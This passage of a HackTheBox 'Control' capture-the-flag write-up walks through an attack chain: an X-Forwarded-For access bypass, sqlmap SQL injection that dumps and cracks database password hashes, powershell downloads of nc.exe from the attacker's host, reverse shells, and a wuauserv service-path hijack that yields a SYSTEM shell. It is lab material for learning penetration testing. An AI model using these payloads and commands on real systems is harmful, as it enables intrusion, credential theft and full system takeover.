[23:56:45] 200 -   17KB - /license.txt
[23:56:45] 200 -   17KB - /LICENSE.txt
[23:56:45] 200 -   17KB - /License.txt
[23:56:57] 301 -  151B  - /uploads  -&gt;  http://10.10.10.167/uploads/
[23:56:57] 403 -    1KB - /uploads/
</code></pre><p>If we take a look at the source of <code>index.php</code> we can see the following comment:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>  <span style=color:#75715e>&lt;!-- To Do:
</span></span></span><span style=display:flex><span><span style=color:#75715e>    - Import Products
</span></span></span><span style=display:flex><span><span style=color:#75715e>    - Link to new payment system
</span></span></span><span style=display:flex><span><span style=color:#75715e>    - Enable SSL (Certificates location \\192.168.4.28\myfiles)
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!-- Header --&gt;</span>
</span></span></code></pre></div><p>Very interesting comment that will help us in the near future.</p><p>Not let&rsquo;s try to reach the <code>admin.php</code> page:</p><pre tabindex=0><code>$ curl http://10.10.10.167/admin.php
Access Denied: Header Missing. Please ensure you go through the proxy to access this page
</code></pre><p>We are denied but we are supposed to go through a proxy, so let&rsquo;s add a
<code>X-Forwarded-For</code> HTTP header and using an internal address we saw the a comment
before <code>192.168.4.28</code>.</p><pre tabindex=0><code>$ curl http://10.10.10.167/admin.php -H &#39;X-Forwarded-For: 192.168.4.28&#39;
</code></pre><p>It works we can access the page but we can do that in <a href=https://portswigger.net/burp>burp</a> in a persistent way
so we can browse the app in our web browser rather than with curl.</p><p>So now we can see this.</p><h3 id=webapp-exploitation>Webapp Exploitation<a hidden class=anchor aria-hidden=true href=#webapp-exploitation>#</a></h3><p><strong>TL;DR</strong>: search products SQLi: dump creds + cmd exec</p><p>There was a comment <em>Import Products</em> and also a SQL database from the nmap scan
so we can try a SQL injection (SQLi).</p><p>I used <a href=https://sqlmap.org>sqlmap</a> (not forgetting to add the <code>X-Forwarded-For</code> header) to
exploit the SQLi.</p><p>First, let&rsquo;s list tables:</p><pre tabindex=0><code>$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data &#39;productName=toto&#39; --tables -H &#39;X-Forwarded-For: 192.168.4.28&#39;

[00:29:49] [INFO] fetching tables for databases: &#39;information_schema, mysql, warehouse&#39;
Database: information_schema
[77 tables]
...

Database: mysql
[31 tables]
+---------------------------------------+
| user                                  |
| column_stats                          |
| columns_priv                          |
| db                                    |
| event                                 |
| func                                  |
| general_log                           |
| global_priv                           |
| gtid_slave_pos                        |
| help_category                         |
| help_keyword                          |
| help_relation                         |
| help_topic                            |
| index_stats                           |
| innodb_index_stats                    |
| innodb_table_stats                    |
| plugin                                |
| proc                                  |
| procs_priv                            |
| proxies_priv                          |
| roles_mapping                         |
| servers                               |
| slow_log                              |
| table_stats                           |
| tables_priv                           |
| time_zone                             |
| time_zone_leap_second                 |
| time_zone_name                        |
| time_zone_transition                  |
| time_zone_transition_type             |
| transaction_registry                  |
+---------------------------------------+

Database: warehouse
[3 tables]
+---------------------------------------+
| product                               |
| product_category                      |
| product_pack                          |
+---------------------------------------+
</code></pre><p>We can dump users credentials stored in table <code>user</code> from database <code>mysql</code>.</p><pre tabindex=0><code>$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data &#39;productName=toto&#39; -H &#39;X-Forwarded-For: 192.168.4.28&#39; -D mysql -T user --dump -C User,Password

+---------+-------------------------------------------+
| User    | Password                                  |
+---------+-------------------------------------------+
| hector  | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D |
| manager | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA |
| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |
+---------+-------------------------------------------+
</code></pre><p>Great, <a href=https://sqlmap.org>sqlmap</a> was able to crack 2 hashes with it&rsquo;s embedded automatic
bruteforce:</p><ul><li><code>manager</code> / <code>l3tm3!n</code></li><li><code>hector</code> / <code>l33th4x0rhector</code></li></ul><p>For your information here are the various methods <a href=https://sqlmap.org>sqlmap</a> was able
to exploit:</p><pre tabindex=0><code>Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-7611&#39; OR 8249=8249#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=toto&#39; AND (SELECT 1413 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(1413=1413,1))),0x7176786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dkpS

    Type: stacked queries
    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
    Payload: productName=toto&#39;;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=toto&#39; AND (SELECT 7102 FROM (SELECT(SLEEP(5)))ETMY)-- bIbM

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=toto&#39; UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178717671,0x5665716b58786a4955776773767048694661436950414263626c756b56717243616f6d59796b4f66,0x7176786a71),NULL#
</code></pre><p>In order to avoid time-based queries we can use the <code>--technique BEUS</code> option.</p><pre tabindex=0><code>sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data &#39;productName=toto&#39; -H &#39;X-Forwarded-For: 192.168.4.28&#39; --os-pwn --dbms mysql --tmp-path &#39;C:/Windows/Temp/&#39; --random-agent --priv-esc --web-root &#39;C:/Inetpub/wwwroot/&#39; --technique BEUS
</code></pre><p>I tried to get a reverse shell with <code>--os-pwn</code> directly but something when wrong
so let&rsquo;s try a more manual approach.</p><p>Let&rsquo;s use <code>--sql-shell</code> to be able to run some SQL queries.</p><pre tabindex=0><code>$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data &#39;productName=toto&#39; -H &#39;X-Forwarded-For: 192.168.4.28&#39; --dbms mysql --sql-shell

select load_file(&#39;C:/WINDOWS/system32/drivers/etc/hosts&#39;): &#39;# Copyright (c) 1993-2009 Microsoft Corp.\r\n#\r\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\r\n#\r\n# This file contains the mappings of IP addresses to host names. Each\r\n# entry should be kept on an individual line. The IP address should\r\n# be placed in the first column followed by the corresponding host name.\r\n# The IP address and the host name should be separated by at least one\r\n# space.\r\n#\r\n# Additionally, comments (such as these) may be inserted on individual\r\n# lines or following the machine name denoted by a &#39;#&#39; symbol.\r\n#\r\n# For example:\r\n#\r\n#      102.54.94.97     rhino.acme.com          # source server\r\n#       38.25.63.10     x.acme.com              # x client host\r\n\r\n# localhost name resolution is handled within DNS itself.\r\n#\t127.0.0.1       localhost\r\n#\t::1             localhost\r\n&#39;
</code></pre><p>With <code>select load_file('C:/WINDOWS/system32/drivers/etc/hosts')</code> it try to see
if we can read files and it&rsquo;s working!</p><pre tabindex=0><code>[17:26:33] [INFO] fetching SQL SELECT statement query output: &#39;select user()&#39;
select user(): &#39;manager@localhost&#39;
</code></pre><p>The current user is <code>manager</code>.</p><pre tabindex=0><code>[17:35:28] [INFO] fetching SQL SELECT statement query output: &#39;select version()&#39;
select version(): &#39;10.4.8-MariaDB&#39;
</code></pre><p>The MySQL implementation is MariaDB.</p><p>Let&rsquo;s check the users&rsquo; privileges.</p><pre tabindex=0><code>$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data &#39;productName=toto&#39; -H &#39;X-Forwarded-For: 192.168.4.28&#39; --dbms mysql --privileges

[17:52:11] [INFO] fetching database users privileges
database management system users privileges:
[*] &#39;hector&#39;@&#39;localhost&#39; (administrator) [29]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DELETE HISTORY
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
[*] &#39;manager&#39;@&#39;localhost&#39; [1]:
    privilege: FILE
[*] &#39;root&#39;@&#39;127.0.0.1&#39; (administrator) [29]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DELETE HISTORY
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
</code></pre><p>It seems our current user <em>manager</em> is less privileged than <em>root</em> or <em>hector</em>
but still has the <em>FILE</em> perm that allowed use to read
<code>C:/WINDOWS/system32/drivers/etc/hosts</code>.</p><p>As I said earlier <code>--os-pwn</code> was not working so I tried <code>--os-shell</code> to run
some command manually.</p><p>I generated (locally) a <code>meterpreter</code> reverse shell.</p><pre tabindex=0><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=9999 -f exe &gt; win.exe
</code></pre><p>And tried to upload it will powershell in the <code>os-shell</code> session.</p><pre tabindex=0><code>os-shell&gt; powershell -nop -c &#34;wget http://10.10.14.34:8080/win.exe -OutFile uploads\win.exe&#34;
</code></pre><p>Unfortunately, there is an EDR blocking and removing our reverse shell.</p><pre tabindex=0><code>&#39;The system cannot execute the specified program.&#39;
</code></pre><p>I persisted and tried with various encoders or without meterpreter.</p><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe -e shikata_ga_nai -i 3 &gt; win.exe
-&gt; spotted

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe -e shikata_ga_nai -i 4100 &gt; win.exe
-&gt; spotted

msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe &gt; win.exe
-&gt; spotted
</code></pre><p>I found <a href=https://medium.com/bugbountywriteup/antivirus-evasion-with-python-49185295caf1>a manual obfuscation method with raw python</a> that claimed to work 100%
of the time but it was overkill and too time consuming to do AV evasion.</p><p>Else is tried to upload <code>nc.exe</code>:</p><pre tabindex=0><code>cp ~/CTF/tools/kali-windows-binaries/nc.exe .
</code></pre><p>Note: the pre-compiled binary can be found here:
<a href=https://github.com/interference-security/kali-windows-binaries>interference-security/kali-windows-binaries</a>.</p><p>So I uploaded it and created a powershell session:</p><pre tabindex=0><code>os-shell&gt; powershell -nop -c &#34;wget http://10.10.15.123:8080/nc.exe -OutFile uploads\nc.exe&#34;
os-shell&gt; uploads\nc.exe 10.10.15.123 9999 -e powershell.exe
</code></pre><p>Yey, the listener caught it without being spotted by the EDR:</p><pre tabindex=0><code>$ nc -nlp 9999
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot&gt;whoami
nt authority\iusr

C:\inetpub\wwwroot&gt;
</code></pre><p>Ok so we are logged as <code>nt authority\iusr</code>, a service account.</p><h3 id=privilege-escalation--isur-to-hector>Privilege Escalation : isur to hector<a hidden class=anchor aria-hidden=true href=#privilege-escalation--isur-to-hector>#</a></h3><p><strong>TL;DR</strong>: powershell <em>runas</em></p><p>So we may need to log as <em>hector</em> or <em>manager</em> to see interesting stuff.</p><p>But <code>runas</code> tricks like this one never works outside a true graphical terminal.</p><pre tabindex=0><code>cmd /C echo l33th4x0rhector | runas /user:hector /netonly cmd.exe
</code></pre><p>So I had to figure out how to do it in powershell.</p><p>Before let&rsquo;s check detailed permissions:</p><pre tabindex=0><code>C:\inetpub\wwwroot&gt;whoami /all
whoami /all

USER INFORMATION
----------------

User Name         SID     
================= ========
nt authority\iusr S-1-5-17

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

ERROR: Unable to get user claims information.
</code></pre><p>I found the following tricks on <a href=https://book.hacktricks.xyz/>Hack Tricks</a>, on this <a href=https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#sudo>page</a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># create a credential object</span>
</span></span><span style=display:flex><span>$pass = ConvertTo-SecureString <span style=color:#e6db74>&#39;l33th4x0rhector&#39;</span> -AsPlainText -Force
</span></span><span style=display:flex><span>$cred = New-Object System.Management.Automation.PSCredential(<span style=color:#e6db74>&#39;CONTROL\Hector&#39;</span>, $pass)
</span></span><span style=display:flex><span><span style=color:#75715e># check if credentials are working executing</span>
</span></span><span style=display:flex><span>Invoke-Command -Computer Fidelity -ScriptBlock { whoami } -Credential $cred
</span></span><span style=display:flex><span><span style=color:#75715e># Now the real command</span>
</span></span><span style=display:flex><span>Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd /c <span style=color:#e6db74>&#34;C:\inetpub\wwwroot\uploads\nc.exe -e powershell 10.10.15.123 10000&#34;</span> }
</span></span></code></pre></div><p>I lost hours at this step. Why?</p><p>Because of troll from the challenge author.</p><p>The <code>Invoke-Command</code> command requires the right hostname to work even if it is
localhost else it fails with an obscure error.</p><p>When you get the hostname of the machine in a classic way, or with enumeration
tool or if you guess that the name of the HTB box, you will think that the
hostname is <code>CONTROL</code> right?</p><pre tabindex=0><code>PS C:\inetpub\wwwroot&gt; gc env:computername
CONTROL

PS C:\inetpub\wwwroot&gt; $env:computername
CONTROL

c:\&gt;echo %computername%
CONTROL
</code></pre><p>Not at all, I don&rsquo;t understand why but the legacy <code>Hostname.exe</code> returns
<code>Fidelity</code>, same in powershell..</p><pre tabindex=0><code>PS C:\inetpub\wwwroot&gt; Hostname.exe
Fidelity

PS C:\inetpub\wwwroot&gt; [System.Net.Dns]::GetHostName()
Fidelity
</code></pre><p>So here I learned that the hostname (DNS) != hostname (computer name).
Most of the time this will be the same, but here it was not.</p><p>For professional and attentive guesser, <code>Fidelity</code> was written on the home
page of the webapp.</p><p>Now that our powershell <code>runas</code> works we can grab the user flag.</p><pre tabindex=0><code>$ nc -nlp 10000
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Hector\Documents&gt; whoami
control\hector

PS C:\Users\Hector&gt; gc Desktop\user.txt
d8782dd01fb15b72c4b5ba77ef2d472b
</code></pre><h3 id=privilege-escalation--hector-to-system>Privilege Escalation : hector to system<a hidden class=anchor aria-hidden=true href=#privilege-escalation--hector-to-system>#</a></h3><p><strong>TL;DR</strong>: bin path SYSTEM service exploit</p><p>We can see if hector has a command history.</p><pre tabindex=0><code>PS C:\Users\Hector&gt; Get-Content C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
</code></pre><p>Fine, it seems to be a clue, we must have to look at services.</p><pre tabindex=0><code>PS C:\Users\Hector&gt; get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i &#34;Hector Users Path Everyone&#34;
</code></pre><p>There are dozens services where hector has full control, let&rsquo;s find one that <code>iusr</code> can restart.</p><p>Let&rsquo;s try with a sysinternal tool.</p><pre tabindex=0><code>$ cp /usr/share/windows/sysinternals-suite/accesschk64.exe .
</code></pre><pre tabindex=0><code>PS C:\Users\Hector\Videos&gt; powershell -nop -c &#34;wget http://10.10.15.123:8080/accesschk64.exe -OutFile cyfun.exe&#34;

.\cyfun.exe -uwcqv Hector * /accepteula
</code></pre><p>But access denied because it tries to open Service Control Manager.</p><p>Get all services:</p><pre tabindex=0><code>PS C:\Users\Hector\Videos&gt; reg query hklm\system\currentcontrolset\services &gt; cyfun.txt
PS C:\Users\Hector\Videos&gt; copy cyfun.txt C:\inetpub\wwwroot\uploads\cyfun.txt
$ cat services_fullpath.txt| cut -d &#39;\&#39; -f 5 &gt; services.txt
</code></pre><p>Get services owners and who can modify them.</p><pre tabindex=0><code>PS C:\Users\Hector\Videos&gt; get-acl HKLM:\System\CurrentControlSet\services\* | Format-List PSChildName,Owner,Group,AccessToString | Out-String -Width 300 &gt; cyfun.txt
PS C:\Users\Hector\Videos&gt; copy cyfun.txt C:\inetpub\wwwroot\uploads\cyfun.txt
</code></pre><p>Get services registry binary path</p><pre tabindex=0><code>PS C:\Users\Hector\Videos&gt; reg query hklm\System\CurrentControlSet\Services /s /v imagepath

powershell -nop -c &#34;wget http://10.10.15.123:8080/services_name.txt -OutFile services_name.txt&#34;
</code></pre><p>In <code>cmd.exe</code> we can try to loop over all services like that:</p><pre tabindex=0><code>FOR /F %i in (services_name.txt) DO @sc qc %i
</code></pre><p>I translated this in PowerShell to check process that the user has access to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($line <span style=color:#66d9ef>in</span> Get-Content .\services_name.txt) { 
</span></span><span style=display:flex><span>  $res = iex <span style=color:#e6db74>&#34;sc.exe qc </span>$line<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>($res <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#39;QueryServiceConfig SUCCESS&#39;</span>){
</span></span><span style=display:flex><span>    echo $res
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>So we have a list of services that Hector can modify, that iusr can restart and
that are own and executed as SYSTEM.</p><p>With Hector we try to modify <code>wuauserv</code> binary to a reverse shell command:</p><pre tabindex=0><code>C:\Users\Hector\Videos&gt;reg add HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\wuauserv /v ImagePath /t REG_EXPAND_SZ /d &#34;C:\Inetpub\wwwroot\uploads\nc.exe 10.10.15.123 10004 -e powershell.exe&#34; /f
The operation completed successfully.
</code></pre><p>With iusr we start the service: <code>sc start wuauserv</code> so we gain a system shell.</p><pre tabindex=0><code>nc -nlp 10004
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32&gt; gc C:\Users\Administrator\Desktop\root.txt
8f8613f5b4da391f36ef11def4cec1b1

PS C:\Windows\system32&gt; whoami
nt authority\system
</code></pre><p>Note: the command is executed even if <code>sc</code> displays an error.</p><p>Why <code>wuauserv</code>? I just tried them all and it worked with this one.</p><h3 id=files>Files<a hidden class=anchor aria-hidden=true href=#files>#</a></h3><p>As the output of the commands listing services were very long I pasted them
in a Gist.</p><p><a href=https://gist.github.com/S4CH/6b3f8d923b661c050e696f2d6e871b94>Gist</a></p><ul><li><a href=https://gist.github.com/S4CH/6b3f8d923b661c050e696f2d6e871b94#file-services_bin_path_for_htb-txt>services_bin_path.txt</a></li><li><a href=https://gist.github.com/S4CH/56934c1c8943c988f8758d9ac03591d9#file-services_full_path_for_htb-txt>services_fullpath.txt</a></li><li><a href=https://gist.github.com/S4CH/3653068fa256096b7ce2b5c223385ceb#file-names_of_services-txt>services_name.txt</a></li><li><a href=https://gist.github.com/S4CH/349fd9b09271f01c3bbd2b532695b289#file-names_of_services-_2-txt>services_name2.txt</a></li><li><a href=https://gist.github.com/S4CH/13da1ea8075115d4859e9130c02e461b#file-services_rights_for_htb-txt>services_rights.txt</a></li><li><a href=https://gist.github.com/S4CH/7f4983f57de320b529a58abc640e71e7#file-restarted_services-txt>services_that_can_be_restarted.txt</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/hard/>Hard</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>